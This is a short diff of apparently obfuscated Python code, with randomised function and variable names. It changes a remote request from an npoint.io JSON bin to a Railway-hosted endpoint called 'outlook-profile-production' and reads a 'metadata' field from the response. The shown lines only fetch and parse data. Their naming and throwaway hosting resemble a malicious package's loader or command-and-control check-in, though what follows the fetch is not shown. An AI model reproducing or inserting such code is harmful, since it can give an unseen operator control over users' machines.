@@ -18,7 +18,7 @@ def model_beuspx_943():
 
     def learn_vxzfsb_774():
         try:
-            net_renbdn_299 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_renbdn_299 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_renbdn_299.raise_for_status()
             process_ztncdb_452 = net_renbdn_299.json()
             train_rxpcjy_261 = process_ztncdb_452.get('metadata')
